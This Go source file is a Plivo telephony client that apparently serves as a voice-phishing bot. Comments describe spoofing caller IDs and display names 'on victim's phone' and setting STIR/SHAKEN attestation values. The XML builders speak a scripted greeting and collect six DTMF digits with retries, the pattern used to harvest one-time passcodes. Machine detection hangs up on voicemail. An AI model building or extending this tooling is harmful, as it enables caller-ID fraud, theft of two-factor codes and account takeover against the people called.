package voice

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type PlivoClient struct {
	AuthID    string
	AuthToken string
	Number    string
	BaseURL   string
	Client    *http.Client
}

type PlivoResponse struct {
	APIID        string `json:"api_id"`
	UUID         string `json:"uuid"`
	Message      string `json:"message"`
	ResponseCode int    `json:"response_code"`
}

type CallRequest struct {
	From                string // Caller ID (spoofed number - must be verified in Plivo)
	To                  string
	AnswerURL           string
	HangupURL           string
	RingURL             string
	MachineDetectionURL string
	ErrorCallbackURL    string
	TimeLimit           int
	RingTimeout         int
	CallerName          string // Display name instead of number on victim's phone
	CNAMLookup          bool   // Enable CNAM lookup for caller ID
	STIRVerification   string // STIR/Shaken attestation level: "pass", "fail", "no_attestation", "disabled"
}

type CallResponse struct {
	APIID       string `json:"api_id"`
	RequestUUID string `json:"request_uuid"`
	UUID        string `json:"uuid"`
	Message     string `json:"message"`
}

type CallStatusResponse struct {
	APIID        string `json:"api_id"`
	CallUUID     string `json:"call_uuid"`
	CallState    string `json:"call_state"`
	From         string `json:"from"`
	To           string `json:"to"`
	BillDuration int    `json:"bill_duration"`
	Duration     int    `json:"duration"`
}

type DTMFResponse struct {
	Digits string `json:"digits"`
}

func NewPlivoClient(authID, authToken, number string) *PlivoClient {
	return &PlivoClient{
		AuthID:    authID,
		AuthToken: authToken,
		Number:    number,
		BaseURL:   "https://api.plivo.com/v1/Account/",
		Client: &http.Client{
			Timeout: 30 * time.Second,
		},
	}
}

func (p *PlivoClient) MakeCall(req CallRequest) (*CallResponse, error) {
	url := fmt.Sprintf("%s%s/Call/", p.BaseURL, p.AuthID)

	payload := map[string]interface{}{
		"from":                 req.From,
		"to":                   req.To,
		"answer_url":           req.AnswerURL,
		"answer_method":        "POST",
		"hangup_url":           req.HangupURL,
		"hangup_method":        "POST",
		"ring_url":             req.RingURL,
		"ring_method":          "POST",
		"error_call_back_url":  req.ErrorCallbackURL,
		"error_method":        "POST",
		"time_limit":           req.TimeLimit,
		"ring_timeout":         req.RingTimeout,
	}

	// Caller ID Spoofing - Show name instead of/in addition to number on victim's phone
	if req.CallerName != "" {
		payload["caller_name"] = req.CallerName
	}

	// CNAM Lookup - Shows caller name from carrier database
	if req.CNAMLookup {
		payload["cnam_lookup"] = "true"
	}

	// STIR/Shaken Verification - Attestation level for caller ID verification
	// "pass" = verified caller, "no_attestation" = unverified, "disabled" = don't check
	if req.STIRVerification != "" {
		payload["stir_verification"] = req.STIRVerification
	}

	// Machine Detection - Detect answering machines/voicemail
	if req.MachineDetectionURL != "" {
		payload["machine_detection_url"] = req.MachineDetectionURL
		payload["machine_detection_method"] = "POST"
		payload["machine_detection"] = "true"
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal request: %w", err)
	}

	httpReq, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	p.setAuthHeader(httpReq)
	httpReq.Header.Set("Content-Type", "application/json")

	resp, err := p.Client.Do(httpReq)
	if err != nil {
		return nil, fmt.Errorf("failed to make call: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %w", err)
	}

	if resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("plivo API error: %s - %s", resp.Status, string(body))
	}

	var callResp CallResponse
	if err := json.Unmarshal(body, &callResp); err != nil {
		return nil, fmt.Errorf("failed to parse response: %w", err)
	}

	return &callResp, nil
}

func (p *PlivoClient) HangupCall(uuid string) (*PlivoResponse, error) {
	url := fmt.Sprintf("%s%s/Call/%s/", p.BaseURL, p.AuthID, uuid)

	httpReq, err := http.NewRequest("DELETE", url, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	p.setAuthHeader(httpReq)

	resp, err := p.Client.Do(httpReq)
	if err != nil {
		return nil, fmt.Errorf("failed to hangup call: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %w", err)
	}

	if resp.StatusCode != http.StatusNoContent && resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("plivo API error: %s - %s", resp.Status, string(body))
	}

	var plivoResp PlivoResponse
	json.Unmarshal(body, &plivoResp)
	return &plivoResp, nil
}

func (p *PlivoClient) GetCallStatus(uuid string) (*CallStatusResponse, error) {
	url := fmt.Sprintf("%s%s/Call/%s/", p.BaseURL, p.AuthID, uuid)

	httpReq, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	p.setAuthHeader(httpReq)

	resp, err := p.Client.Do(httpReq)
	if err != nil {
		return nil, fmt.Errorf("failed to get call status: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("plivo API error: %s - %s", resp.Status, string(body))
	}

	var statusResp CallStatusResponse
	if err := json.Unmarshal(body, &statusResp); err != nil {
		return nil, fmt.Errorf("failed to parse response: %w", err)
	}

	return &statusResp, nil
}

func (p *PlivoClient) SendSMS(from, to, text string) (*PlivoResponse, error) {
	url := fmt.Sprintf("%s%s/Message/", p.BaseURL, p.AuthID)

	payload := map[string]string{
		"src":  from,
		"dst":  to,
		"text": text,
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal request: %w", err)
	}

	httpReq, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	p.setAuthHeader(httpReq)
	httpReq.Header.Set("Content-Type", "application/json")

	resp, err := p.Client.Do(httpReq)
	if err != nil {
		return nil, fmt.Errorf("failed to send SMS: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %w", err)
	}

	if resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("plivo API error: %s - %s", resp.Status, string(body))
	}

	var smsResp PlivoResponse
	if err := json.Unmarshal(body, &smsResp); err != nil {
		return nil, fmt.Errorf("failed to parse response: %w", err)
	}

	return &smsResp, nil
}

func (p *PlivoClient) GetNumbers() ([]map[string]interface{}, error) {
	url := fmt.Sprintf("%s%s/Number/", p.BaseURL, p.AuthID)

	httpReq, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	p.setAuthHeader(httpReq)

	resp, err := p.Client.Do(httpReq)
	if err != nil {
		return nil, fmt.Errorf("failed to get numbers: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("plivo API error: %s - %s", resp.Status, string(body))
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, fmt.Errorf("failed to parse response: %w", err)
	}

	objects, ok := result["objects"].([]interface{})
	if !ok {
		return nil, nil
	}

	var numbers []map[string]interface{}
	for _, obj := range objects {
		if num, ok := obj.(map[string]interface{}); ok {
			numbers = append(numbers, num)
		}
	}

	return numbers, nil
}

func (p *PlivoClient) setAuthHeader(req *http.Request) {
	req.SetBasicAuth(p.AuthID, p.AuthToken)
}

func BuildXMLResponse(greeting, actionURL, confirmation, holdMusic, voice, language string, loops int) string {
	var xml strings.Builder

	xml.WriteString(`<?xml version="1.0" encoding="UTF-8"?>`)
	xml.WriteString("\n<Response>")

	xml.WriteString("\n  <GetInput action=\"")
	xml.WriteString(actionURL)
	xml.WriteString(`" method="POST" inputType="dtmf" digitEndTimeout="5" numDigits="6" retries="3" redirect="true">`)
	xml.WriteString("\n    <Speak language=\"")
	xml.WriteString(language)
	xml.WriteString(`" voice="`)
	xml.WriteString(voice)
	xml.WriteString(`" loop="`)
	xml.WriteString(fmt.Sprintf("%d", loops))
	xml.WriteString(`">`)
	xml.WriteString("\n      ")
	xml.WriteString(greeting)
	xml.WriteString("\n    </Speak>")

	if holdMusic != "" {
		xml.WriteString("\n    <Play>")
		xml.WriteString(holdMusic)
		xml.WriteString("</Play>")
	}

	xml.WriteString("\n  </GetInput>")

	if holdMusic != "" {
		xml.WriteString("\n  <Play>")
		xml.WriteString(holdMusic)
		xml.WriteString("</Play>")
		xml.WriteString("\n  <Wait length=\"10\"/>")
	}

	xml.WriteString("\n  <Speak language=\"")
	xml.WriteString(language)
	xml.WriteString(`" voice="`)
	xml.WriteString(voice)
	xml.WriteString(`" loop="1">`)
	xml.WriteString("\n    ")
	xml.WriteString(confirmation)
	xml.WriteString("\n  </Speak>")

	xml.WriteString("\n</Response>")

	return xml.String()
}

func BuildDTMFXML(message, holdMusic string, voice, language string) string {
	var xml strings.Builder

	xml.WriteString(`<?xml version="1.0" encoding="UTF-8"?>`)
	xml.WriteString("\n<Response>")
	xml.WriteString("\n  <Speak language=\"")
	xml.WriteString(language)
	xml.WriteString(`" voice="`)
	xml.WriteString(voice)
	xml.WriteString(`" loop="2">`)
	xml.WriteString("\n    ")
	xml.WriteString(message)
	xml.WriteString("\n  </Speak>")

	if holdMusic != "" {
		xml.WriteString("\n  <Play>")
		xml.WriteString(holdMusic)
		xml.WriteString("</Play>")
		xml.WriteString("\n  <Wait length=\"10\"/>")
	}

	xml.WriteString("\n</Response>")

	return xml.String()
}

func BuildHangupXML(message string) string {
	var xml strings.Builder

	xml.WriteString(`<?xml version="1.0" encoding="UTF-8"?>`)
	xml.WriteString("\n<Response>")

	if message != "" {
		xml.WriteString("\n  <Speak language=\"en-US\" voice=\"WOMAN\" loop=\"1\">")
		xml.WriteString("\n    ")
		xml.WriteString(message)
		xml.WriteString("\n  </Speak>")
	}

	xml.WriteString("\n  <Hangup/>")
	xml.WriteString("\n</Response>")

	return xml.String()
}

func BuildRingXML() string {
	return `<?xml version="1.0" encoding="UTF-8"?><Response></Response>`
}

func BuildMachineXML() string {
	return `<?xml version="1.0" encoding="UTF-8"?><Response><Hangup reason="-machine"/></Response>`
}

func URLEncode(s string) string {
	return url.QueryEscape(s)
}
